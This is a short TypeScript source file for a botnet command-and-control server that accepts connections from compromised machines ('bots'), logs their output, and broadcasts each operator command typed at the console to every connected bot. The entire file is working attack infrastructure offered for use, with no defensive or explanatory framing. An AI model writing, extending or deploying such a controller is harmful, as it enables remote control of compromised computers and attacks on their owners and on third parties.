import net from "net";

const PORT = 9999; //change your port here
const bots: net.Socket[] = [];

const server = net.createServer((socket) => {
  console.log(`[+] Bot connected from ${socket.remoteAddress}`);
  bots.push(socket);

  socket.on("data", (data) => {
    console.log(`[BOT OUTPUT] ${data.toString()}`);
  });

  socket.on("end", () => {
    console.log("[-] Bot disconnected");
    bots.splice(bots.indexOf(socket), 1);
  });

  socket.on("error", () => {
    bots.splice(bots.indexOf(socket), 1);
  });
});

server.listen(PORT, () => {
  console.log(`[C2C] Listening on port ${PORT}`);
});

// CLI command input
process.stdin.on("data", (data) => {
  const cmd = data.toString().trim();
  if (cmd === "") return;

  bots.forEach((bot) => {
    try {
      bot.write(cmd + "\n");
    } catch (e) {
      console.log("[-] Bot error, skipping...");
    }
  });
});
